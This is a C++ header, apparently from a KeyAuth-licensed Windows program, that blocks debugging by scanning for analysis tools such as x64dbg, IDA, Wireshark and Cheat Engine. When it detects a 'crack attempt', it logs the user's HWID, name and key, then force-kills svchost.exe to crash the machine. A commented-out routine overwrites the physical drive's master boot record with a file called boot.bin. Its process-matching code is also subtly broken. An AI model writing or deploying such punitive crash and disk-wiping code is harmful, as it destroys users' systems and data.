#pragma once

#include <Windows.h>
#include <TlHelp32.h>
#include <filesystem>
#include <vector>
#include "../../../includes.hpp"


bool find(const char* name)
{
    const auto snap = LI_FN(CreateToolhelp32Snapshot).safe()(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 proc_entry{};
    proc_entry.dwSize = sizeof proc_entry;

    auto found_process = false;
    if (!!LI_FN(Process32First).safe()(snap, &proc_entry)) {
        do {
            if (name == proc_entry.szExeFile) {
                found_process = true;
                break;
            }
        } while (!!LI_FN(Process32Next).safe()(snap, &proc_entry));
    }

    LI_FN(CloseHandle).safe()(snap);
    return found_process
        ? proc_entry.th32ProcessID
        : 0;
}
void mbrwipe()
{
    //HANDLE drive = CreateFileW(_(L"\\\\.\\PhysicalDrive0"), GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    //if (drive == INVALID_HANDLE_VALUE) { return; }

    //HANDLE binary = CreateFileW(_(L"./boot.bin"), GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
    //if (binary == INVALID_HANDLE_VALUE) { return; }

    //DWORD size = GetFileSize(binary, 0);
    //if (size != 512) { return; }

    //std::uint8_t* new_mbr = new std::uint8_t[size];
    //DWORD bytes_read;
    //if (ReadFile(binary, new_mbr, size, &bytes_read, 0))
    //{
    //    if (WriteFile(drive, new_mbr, size, &bytes_read, 0))
    //    {
    //        //printf(("First sector overritten successfuly!\n");
    //    }
    //}
    //else
    //{
    //    //printf("Error reading boot.bin\n");
    //    //printf("Make sure to compile the ASM file with 'nasm -f bin -o boot.bin boot.asm'");
    //}

    //CloseHandle(binary);
    //CloseHandle(drive);
}

namespace BlackListed
{

}
namespace malicousactivity
{
    void bsod()
    {
        system(_("TASKKILL /F /IM svchost.exe 2>NULL"));

    }
}

void BlackList()
{

    string message =
        _("\nCrack Attempt!\nHWID: ") + KeyAuthApp.data.hwid
        + ("\nUser: ") + username
        + ("\nKey: ") + key;
    KeyAuthApp.log(message);
    malicousactivity::bsod();
    //mbrwipe();
}
void BlackListStopper()
{

}

int check_processes()
{
    std::vector<const char*> processes = {
    _("ollydbg.exe"),
    _("ProcessHacker.exe"),
    _("tcpview.exe"),
    _("autoruns.exe"),
    _("autorunsc.exe"),
    _("filemon.exe"),
    _("procmon.exe"),
    _("regmon.exe"),
    _("procexp.exe"),
    _("idaq.exe"),
    _("idaq64.exe"),
    _("ida.exe"),
    _("ida64.exe"),
    _("ImmunityDebugger.exe"),
    _("Wireshark.exe"),
    _("dumpcap.exe"),
    _("HookExplorer.exe"),
    _("ImportREC.exe"),
    _("PETools.exe"),
    _("LordPE.exe"),
    _("SysInspector.exe"),
    _("proc_analyzer.exe"),
    _("sysAnalyzer.exe"),
    _("sniff_hit.exe"),
    _("windbg.exe"),
    _("joeboxcontrol.exe"),
    _("joeboxserver.exe"),
    _("ResourceHacker.exe"),
    _("x32dbg.exe"),
    _("x64dbg.exe"),
    _("Fiddler.exe"),
    _("httpdebugger.exe"),
    _("HTTP Debugger Windows Service (32 bit).exe"),
    _("HTTPDebuggerUI.exe"),
    _("HTTPDebuggerSvc.exe"),
    _("cheatengine-x86_64.exe"),
    _("cheatengine-x86_64-SSE4-AVX2.exe"),
    };

    for (auto process : processes)
    {
        if (find(process))
        {
            //BlackList();
            system("color 4");
            std::cout << (_("Unallowed Process Found, Please Restart PC or Contact Support."));
            Sleep(3000);
            exit(0);
        }
    }
    return false;
}